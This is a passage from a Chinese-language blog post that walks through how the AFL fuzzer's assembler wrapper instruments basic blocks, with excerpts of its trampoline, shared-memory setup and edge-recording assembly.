other than call / jmp.</span></span><br><span class="line"><span class="comment">           That said, this complicates the code by requiring two-pass</span></span><br><span class="line"><span class="comment">           processing (messy with stdin), and results in a speed gain</span></span><br><span class="line"><span class="comment">           typically under 10%, because compilers are generally pretty good</span></span><br><span class="line"><span class="comment">           about not generating spurious intra-function jumps.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">           We use deferred output chiefly to avoid disrupting</span></span><br><span class="line"><span class="comment">           .Lfunc_begin0-style exception handling calculations (a problem on</span></span><br><span class="line"><span class="comment">           MacOS X). */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!skip_next_label) instrument_next = <span class="number">1</span>; <span class="keyword">else</span> skip_next_label = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Function label (always instrumented, deferred mode). */</span></span><br><span class="line"></span><br><span class="line">      instrument_next = <span class="number">1</span>;</span><br><span class="line">  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意到这里并不是所有的基本块都会进行代码的插入，实际上这里存在一个概率<code>inst_ratio</code> 虽然默认的值是100，但是我们可以更改这个值。注意这里判断的实际上就是切分的Block，我们这里可以看一个例子，源码如下</p><ul><li><p>例子的源码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> i = <span class="number">1</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>注意到这里只有在保留调试信息的时候才会保留本地符号也就是.L开头的符号，我们这里生成汇编的命令如下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -g -m64 -S -o test.s test.c</span><br></pre></td></tr></table></figure><ul><li><p>生成的部分汇编如下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">main:</span><br><span class="line">.LFB0:</span><br><span class="line">        .file <span class="number">1</span> <span class="string">&quot;test.c&quot;</span></span><br><span class="line">        .loc <span class="number">1</span> <span class="number">3</span> <span class="number">12</span></span><br><span class="line">        .cfi_startproc</span><br><span class="line">        endbr64</span><br><span class="line">        pushq   %rbp</span><br><span class="line">        .cfi_def_cfa_offset <span class="number">16</span></span><br><span class="line">        .cfi_offset <span class="number">6</span>, <span class="number">-16</span></span><br><span class="line">        movq    %rsp, %rbp</span><br><span class="line">        .cfi_def_cfa_register <span class="number">6</span></span><br><span class="line">        subq    $<span class="number">16</span>, %rsp</span><br><span class="line">        .loc <span class="number">1</span> <span class="number">4</span> <span class="number">9</span></span><br><span class="line">        movl    $<span class="number">0</span>, <span class="number">-8</span>(%rbp)</span><br><span class="line">.LBB2:</span><br><span class="line">        .loc <span class="number">1</span> <span class="number">6</span> <span class="number">13</span></span><br><span class="line">        movl    $<span class="number">1</span>, <span class="number">-4</span>(%rbp)</span><br><span class="line">        .loc <span class="number">1</span> <span class="number">7</span> <span class="number">9</span></span><br><span class="line">        movl    <span class="number">-4</span>(%rbp), %eax</span><br><span class="line">        movl    %eax, %esi</span><br><span class="line">        leaq    .<span class="built_in">LC0</span>(%rip), %rdi</span><br><span class="line">        movl    $<span class="number">0</span>, %eax</span><br><span class="line">        call    printf@PLT</span><br><span class="line">.LBE2:</span><br><span class="line">        .loc <span class="number">1</span> <span class="number">9</span> <span class="number">12</span></span><br><span class="line">        movl    $<span class="number">0</span>, %eax</span><br><span class="line">        .loc <span class="number">1</span> <span class="number">10</span> <span class="number">1</span></span><br><span class="line">        leave</span><br><span class="line">        .cfi_def_cfa <span class="number">7</span>, <span class="number">8</span></span><br><span class="line">        ret</span><br><span class="line">        .cfi_endproc</span><br><span class="line">.LFE0:</span><br></pre></td></tr></table></figure></li><li><p>另一种形式的汇编</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">.L3:</span><br><span class="line">        .loc <span class="number">1</span> <span class="number">8</span> <span class="number">9</span> discriminator <span class="number">3</span></span><br><span class="line">        movl    <span class="number">-4</span>(%rbp), %eax</span><br><span class="line">        movl    %eax, %esi</span><br><span class="line">        leaq    .<span class="built_in">LC0</span>(%rip), %rdi</span><br><span class="line">        movl    $<span class="number">0</span>, %eax</span><br><span class="line">        call    printf@PLT</span><br><span class="line">        .loc <span class="number">1</span> <span class="number">5</span> <span class="number">24</span> discriminator <span class="number">3</span></span><br><span class="line">        addl    $<span class="number">1</span>, <span class="number">-4</span>(%rbp)</span><br><span class="line">.L2:</span><br><span class="line">        .loc <span class="number">1</span> <span class="number">5</span> <span class="number">5</span> discriminator <span class="number">1</span></span><br><span class="line">        cmpl    $<span class="number">4</span>, <span class="number">-4</span>(%rbp)</span><br><span class="line">        jle     .L3</span><br><span class="line">        .loc <span class="number">1</span> <span class="number">10</span> <span class="number">12</span></span><br><span class="line">        movl    $<span class="number">0</span>, %eax</span><br><span class="line">        .loc <span class="number">1</span> <span class="number">11</span> <span class="number">1</span></span><br><span class="line">        leave</span><br><span class="line">        .cfi_def_cfa <span class="number">7</span>, <span class="number">8</span></span><br><span class="line">        ret</span><br><span class="line">        .cfi_endproc</span><br></pre></td></tr></table></figure></li></ul><p>这里我们需要注意的是这里call并不会作为基本块划分的条件。同时这里条件跳转也不会进行基本块的划分。</p><p>也就是这里.LFB0表示的是一个函数的开始部分，同时应该也表示一个基本块的开始，也就是Local Function Begin，后面的0表示的是函数的index的值。那么下面的<code>.LBB2</code> 则就表示的是一个基本块的开始，同时index=2。也就是这里在每个基本块的开始进行了代码的插入。</p><h3 id="插桩位置2-条件跳转之后"><a href="#插桩位置2-条件跳转之后" class="headerlink" title="插桩位置2-条件跳转之后"></a>插桩位置2-条件跳转之后</h3><p>同时这里还存在另一处的插桩代码如下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (line[<span class="number">0</span>] == <span class="string">&#x27;\t&#x27;</span>) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (line[<span class="number">1</span>] == <span class="string">&#x27;j&#x27;</span> &amp;&amp; line[<span class="number">2</span>] != <span class="string">&#x27;m&#x27;</span> &amp;&amp; <span class="built_in">R</span>(<span class="number">100</span>) &lt; inst_ratio) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(outf, use_64bit ? trampoline_fmt_64 : trampoline_fmt_32,</span><br><span class="line">            <span class="built_in">R</span>(MAP_SIZE));</span><br><span class="line"></span><br><span class="line">    ins_lines++;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也就是这里对与条件跳转，在条件跳转之后有一定的几率去进行插桩，这里几率默认的则是100。这里只在条件跳转语句之后插桩是没有问题的，因为跳转的目标一定是一个基本块的开始，我们之前已经在其起始位置插桩完成了。</p><h3 id="插桩位置3-结尾"><a href="#插桩位置3-结尾" class="headerlink" title="插桩位置3-结尾"></a>插桩位置3-结尾</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (ins_lines)</span><br><span class="line">    <span class="built_in">fputs</span>(use_64bit ? main_payload_64 : main_payload_32, outf);</span><br></pre></td></tr></table></figure><p>注意到这里在整个文件处理完毕之后还会插入一段内容。</p><h2 id="插桩的内容"><a href="#插桩的内容" class="headerlink" title="插桩的内容"></a>插桩的内容</h2><p>这里通过前面的分析我们知道一共插入了两种内容，分别是<code>trampoline_fmt_64</code> 以及<code>main_payload_64</code> 这里从插入的位置来看，我们实际上就可以推测出<code>trampoline_fmt_64</code> 负责跳转到路径记录的函数，而<code>main_payload_64</code> 则包含了一些初始化或者记录路径信息的函数。这里我们分别来看一下，需要注意的是这里只是针对64位下的代码。</p><h3 id="trampoline-fmt-64"><a href="#trampoline-fmt-64" class="headerlink" title="trampoline_fmt_64"></a>trampoline_fmt_64</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> u8* trampoline_fmt_64 =</span><br><span class="line"></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;/* --- AFL TRAMPOLINE (64-BIT) --- */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;.align 4\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;leaq -(128+24)(%%rsp), %%rsp\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq %%rdx,  0(%%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq %%rcx,  8(%%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq %%rax, 16(%%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq $0x%08x, %%rcx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;call __afl_maybe_log\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq 16(%%rsp), %%rax\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq  8(%%rsp), %%rcx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq  0(%%rsp), %%rdx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;leaq (128+24)(%%rsp), %%rsp\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;/* --- END --- */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure><p>这里逻辑很简单，即调用了<code>__afl_maybe_log</code>函数，我们看一下这个函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;__afl_maybe_log:\n&quot;</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;  lahf\n&quot;</span></span><br><span class="line"><span class="string">&quot;  seto %al\n&quot;</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;  /* Check if SHM region is already mapped. */\n&quot;</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movl  __afl_area_ptr, %edx\n&quot;</span></span><br><span class="line"><span class="string">&quot;  testl %edx, %edx\n&quot;</span></span><br><span class="line"><span class="string">&quot;  je    __afl_setup\n&quot;</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br></pre></td></tr></table></figure><p><code>lahf</code> 指令是将<code>EFLAGS</code> 寄存器数组的低字节拷贝到AH寄存器中。<code>seto</code> 指令则是如果出现溢出的话，那么就将al设置为1。接着判断了<code>__afl_area_ptr</code> 的值是否被设置了。如果没有设置的话，那么就会跳转到<code>__afl_setup</code> 部分去执行，我们看一下</p><h3 id="afl-setup"><a href="#afl-setup" class="headerlink" title="__afl_setup"></a>__afl_setup</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;.AFL_SHM_ENV:\n&quot;</span></span><br><span class="line"><span class="string">&quot;  .asciz \&quot;&quot;</span> SHM_ENV_VAR <span class="string">&quot;\&quot;\n&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;__afl_setup:\n&quot;</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;  /* Do not retry setup if we had previous failures. */\n&quot;</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;  cmpb $0, __afl_setup_failure(%rip)\n&quot;</span></span><br><span class="line"><span class="string">&quot;  jne __afl_return\n&quot;</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;  /* Check out if we have a global pointer on file. */\n&quot;</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> __APPLE__</span></span><br><span class="line"><span class="string">&quot;  movq  __afl_global_area_ptr@GOTPCREL(%rip), %rdx\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq  (%rdx), %rdx\n&quot;</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="string">&quot;  movq  __afl_global_area_ptr(%rip), %rdx\n&quot;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* !^__APPLE__ */</span></span></span><br><span class="line"><span class="string">&quot;  testq %rdx, %rdx\n&quot;</span></span><br><span class="line"><span class="string">&quot;  je    __afl_setup_first\n&quot;</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq %rdx, __afl_area_ptr(%rip)\n&quot;</span></span><br><span class="line"><span class="string">&quot;  jmp  __afl_store\n&quot;</span> </span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br></pre></td></tr></table></figure><p>这里<code>AFL_SHM_ENV</code> 是环境变量的字符串。这里如果<code>__afl_area_ptr</code>设置了，那么就跳转到<code>__afl_store</code> 部分去执行，如果没有设置，那么就会执行如下的代码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;__afl_setup_first:\n&quot;</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;  /* Save everything that is not yet saved and that may be touched by\n&quot;</span></span><br><span class="line"><span class="string">&quot;     getenv() and several other libcalls we&#x27;ll be relying on. */\n&quot;</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;  leaq -352(%rsp), %rsp\n&quot;</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq %rax,   0(%rsp)\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq %rcx,   8(%rsp)\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq %rdi,  16(%rsp)\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq %rsi,  32(%rsp)\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq %r8,   40(%rsp)\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq %r9,   48(%rsp)\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq %r10,  56(%rsp)\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq %r11,  64(%rsp)\n&quot;</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq %xmm0,  96(%rsp)\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq %xmm1,  112(%rsp)\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq %xmm2,  128(%rsp)\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq %xmm3,  144(%rsp)\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq %xmm4,  160(%rsp)\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq %xmm5,  176(%rsp)\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq %xmm6,  192(%rsp)\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq %xmm7,  208(%rsp)\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq %xmm8,  224(%rsp)\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq %xmm9,  240(%rsp)\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq %xmm10, 256(%rsp)\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq %xmm11, 272(%rsp)\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq %xmm12, 288(%rsp)\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq %xmm13, 304(%rsp)\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq %xmm14, 320(%rsp)\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq %xmm15, 336(%rsp)\n&quot;</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;  /* Map SHM, jumping to __afl_setup_abort if something goes wrong. */\n&quot;</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;  /* The 64-bit ABI requires 16-byte stack alignment. We&#x27;ll keep the\n&quot;</span></span><br><span class="line"><span class="string">&quot;     original stack ptr in the callee-saved r12. */\n&quot;</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;  pushq %r12\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq  %rsp, %r12\n&quot;</span></span><br><span class="line"><span class="string">&quot;  subq  $16, %rsp\n&quot;</span></span><br><span class="line"><span class="string">&quot;  andq  $0xfffffffffffffff0, %rsp\n&quot;</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;  leaq .AFL_SHM_ENV(%rip), %rdi\n&quot;</span></span><br><span class="line"><span class="built_in">CALL_L64</span>(<span class="string">&quot;getenv&quot;</span>)</span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;  testq %rax, %rax\n&quot;</span></span><br><span class="line"><span class="string">&quot;  je    __afl_setup_abort\n&quot;</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq  %rax, %rdi\n&quot;</span></span><br><span class="line"><span class="built_in">CALL_L64</span>(<span class="string">&quot;atoi&quot;</span>)</span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;  xorq %rdx, %rdx   /* shmat flags    */\n&quot;</span></span><br><span class="line"><span class="string">&quot;  xorq %rsi, %rsi   /* requested addr */\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq %rax, %rdi   /* SHM ID         */\n&quot;</span></span><br><span class="line"><span class="built_in">CALL_L64</span>(<span class="string">&quot;shmat&quot;</span>)</span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;  cmpq $-1, %rax\n&quot;</span></span><br><span class="line"><span class="string">&quot;  je   __afl_setup_abort\n&quot;</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;  /* Store the address of the SHM region. */\n&quot;</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq %rax, %rdx\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq %rax, __afl_area_ptr(%rip)\n&quot;</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __APPLE__</span></span><br><span class="line"><span class="string">&quot;  movq %rax, __afl_global_area_ptr(%rip)\n&quot;</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="string">&quot;  movq __afl_global_area_ptr@GOTPCREL(%rip), %rdx\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq %rax, (%rdx)\n&quot;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* ^__APPLE__ */</span></span></span><br><span class="line"><span class="string">&quot;  movq %rax, %rdx\n&quot;</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br></pre></td></tr></table></figure><p>在保存了一些寄存器数组之后，这里即调用了<code>getenv</code> 函数来获取<code>AFL_SHM_ENV</code> 的值，这里我们通过前面的分析实际上这里<code>AFL_SHM_ENV</code>保存的是共享内存的id值。拿到id值之后这里即调用<code>shmat</code> 函数，将其映射到了本次的进程内存中。注意到这里的内存地址直接保存到了<code>__afl_area_ptr</code> 函数中。也就是这里<code>__afl_area_ptr</code>实际上表示的就是路径信息的内存空间。</p><p>接下来会启动fork_server。这里会调用fork函数</p><h3 id="afl-forkserver"><a href="#afl-forkserver" class="headerlink" title="__afl_forkserver"></a>__afl_forkserver</h3><p>这里父进程会一直陷入到循环中，通过pipe管道来接受消息。也就是前面和Fuzz进行通信的部分。</p><h3 id="afl-store"><a href="#afl-store" class="headerlink" title="__afl_store"></a>__afl_store</h3><p>这里子进程则会开始记录信息的过程，我们看一下这一部分的代码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;__afl_store:\n&quot;</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;  /* Calculate and store hit for the code location specified in ecx. There\n&quot;</span></span><br><span class="line"><span class="string">&quot;     is a double-XOR way of doing this without tainting another register,\n&quot;</span></span><br><span class="line"><span class="string">&quot;     and we use it on 64-bit systems; but it&#x27;s slower for 32-bit ones. */\n&quot;</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> COVERAGE_ONLY</span></span><br><span class="line"><span class="string">&quot;  movl __afl_prev_loc, %edi\n&quot;</span></span><br><span class="line"><span class="string">&quot;  xorl %ecx, %edi\n&quot;</span></span><br><span class="line"><span class="string">&quot;  shrl $1, %ecx\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movl %ecx, __afl_prev_loc\n&quot;</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="string">&quot;  movl %ecx, %edi\n&quot;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* ^!COVERAGE_ONLY */</span></span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SKIP_COUNTS</span></span><br><span class="line"><span class="string">&quot;  orb  $1, (%edx, %edi, 1)\n&quot;</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="string">&quot;  incb (%edx, %edi, 1)\n&quot;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* ^SKIP_COUNTS */</span></span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;__afl_return:\n&quot;</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;  addb $127, %al\n&quot;</span></span><br><span class="line"><span class="string">&quot;  sahf\n&quot;</span></span><br><span class="line"><span class="string">&quot;  ret\n&quot;</span></span><br></pre></td></tr></table></figure><p>这里我们看到路径的上一个基本块被保存在<code>__afl_prev_loc</code> 全局变量中，而当前基本块的ID则保存在ecx中，实际上这里的ecx的值是通过我们在插桩的时候传入进来的，如下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">fprintf</span>(outf, use_64bit ? trampoline_fmt_64 : trampoline_fmt_32,</span><br><span class="line">                <span class="built_in">R</span>(MAP_SIZE));</span><br></pre></td></tr></table></figure><p>也就是这里传入了一个MAP_SIZE大小的随机数作为当前基本块的一个ID。这里我们就可以看到路径记录方面的内容。如果这里不对路径命中进行计数的话，那么这里只会将命中的路径的值设置为1。如果需要统计计数的话，那么这里则会直接对相应位置采取加的操作。</p><h2 id="命中次数的计算"><a href="#命中次数的计算" class="headerlink" title="命中次数的计算"></a>命中次数的计算</h2><p>这里前面我们分析到，命中一组路径元组的话，其在trace_bits中相应位置的值就会增加，但是这并不表示最终的命中次数的结果。每一次<code>run_target</code> 函数执行完毕获取得到trace_bits之后都会进行一个处理，即调用<code>classify_counts</code> 函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 